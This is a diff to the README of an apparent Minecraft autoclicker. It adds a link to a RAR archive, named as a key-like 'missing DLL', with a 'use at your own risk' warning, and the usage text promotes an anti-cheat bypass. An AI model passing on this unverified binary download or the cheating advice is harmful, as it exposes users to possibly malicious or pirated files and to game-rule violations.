@@ -3,6 +3,7 @@
 Advanced AutoClicker For Minecraft Made In C#.
 * Discord Server : https://discord.gg/c7jbMDqbNy
    * Star Repo To Support Me :)
+    * The Missing DLL To Debug (Safe But, Use At Your Own Risk) : https://github.com/Pickleft/tools/blob/main/GunaUI-Key.rar?raw=true
  
 ## Features 
 
@@ -21,6 +22,8 @@ Advanced AutoClicker For Minecraft Made In C#.
 ## Usage
 
 * Configure Your CPS & Options. Leave Randomization On If You Want A Anti-Cheat Bypass
+* The Missing DLL To Debug (Safe But, Use At Your Own Risk) : https://github.com/Pickleft/tools/blob/main/GunaUI-Key.rar?raw=true
+
 
 ## Authors
 
